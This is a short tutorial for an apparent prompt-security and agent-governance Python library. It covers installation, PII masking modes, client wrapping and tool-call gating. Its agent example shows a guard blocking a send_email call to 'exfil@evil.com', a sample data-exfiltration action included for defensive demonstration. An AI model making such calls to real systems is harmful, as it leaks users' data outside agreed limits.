# Tutorial

**Goal:** install ASHA, process one prompt end-to-end, wrap an LLM client pattern, and run a governed mock agent. About five minutes. (v0.4.2 developer preview; pin `asha-si==0.4.2`.)

---

## 1. Install

```bash
pip install asha-si
```

Python **3.10+** required. No API key and no model download are needed for this tutorial.

Verify:

```python
from asha import process

print(process("Hello world").output)
```

---

## 2. Process a prompt

`process()` runs security → compile → optimize and always returns a typed `ProcessResult`. `str(result)` equals `result.output`.

```python
from asha import process

result = process(
    "Contact john@example.com for data analysis",
    mode="balanced",
)

print(result.output)
print(result.security.pii_detected)
print(result.metrics)
```

Sensitive values are masked (emails, phones, SSNs, API keys, and related patterns). Teaching placeholders such as `test@example.com` are skipped.

### Modes you will use most

| Mode | Behavior |
|------|----------|
| `balanced` | Default: security + optimization; fail-open on total failure |
| `strict` | Fail-closed: raises on total failure |
| `lite` | Minimal policy features |
| `off` | Passthrough (prompt unchanged) |

```python
process("...", mode="strict")
process("...", mode="off")
```

Security-only or optimize-only:

```python
from asha import sanitize, optimize

print(sanitize("john@x.com").output)
print(optimize("Please carefully and thoroughly analyze the following dataset").output)
```

---

## 3. Wrap an LLM client (optional)

Requires `pip install asha-si[openai]` and `OPENAI_API_KEY`. Skip this step if you only want local preprocessing.

```python
from asha.integrations import wrap_llm
import openai

client = wrap_llm(openai.OpenAI(), mode="balanced")

response = client.chat.completions.create(
    model="gpt-4o-mini",
    messages=[{"role": "user", "content": "Analyze data with john@email.com"}],
)
```

Import `wrap_llm` from **`asha.integrations`**, not the package root. Use `mode="off"` for passthrough.

---

## 4. Govern a mock agent with ANCHOR

ANCHOR compiles a mission contract and gates tool calls. Use `interactive=False` in scripts and CI so REVIEW verdicts do not block on a TTY prompt.

```python
from asha import Agent, anchor

agent = anchor(
    Agent(provider="mock", model="mock", tools=["read_file", "email"]),
    risk_tolerance="LOW",
    isolation="auto",
    interactive=False,
)

print(agent.run("Generate the monthly sales report from Q1 data"))
```

To see an explicit ALLOW vs BLOCK decision without an LLM:

```python
from asha.runtime.anchor import AnchorRuntime
from asha.exceptions import ASHAAnchorBlocked

runtime = AnchorRuntime(warn_policy="strict", interactive=False, risk_tolerance="LOW")
runtime.initialize_mission(
    "Analyze Q1 sales locally and write a report. Do not send data externally.",
    context={
        "available_tools": ["load_sales_data", "write_report", "send_email"],
        "local_only": True,
    },
)

assert runtime.evaluate_action_request(
    "tool_call",
    {
        "tool_name": "write_report",
        "arguments": str({"args": (), "kwargs": {"report_content": "Q1 summary"}}),
    },
)

try:
    runtime.evaluate_action_request(
        "tool_call",
        {
            "tool_name": "send_email",
            "arguments": str({"args": (), "kwargs": {"to": "exfil@evil.com"}}),
        },
        raise_on_block=True,
    )
except ASHAAnchorBlocked as err:
    print(err)
```

---

## 5. Next steps

1. [Status](status.md): stable vs experimental
2. [Core concepts](core-concepts.md): results, modes, `PolicyConfig`
3. [ANCHOR](anchor.md): mission contracts, isolation, adapters
4. [API reference](api-reference.md): full signatures
5. [Security](security.md): PII and fail-closed behavior
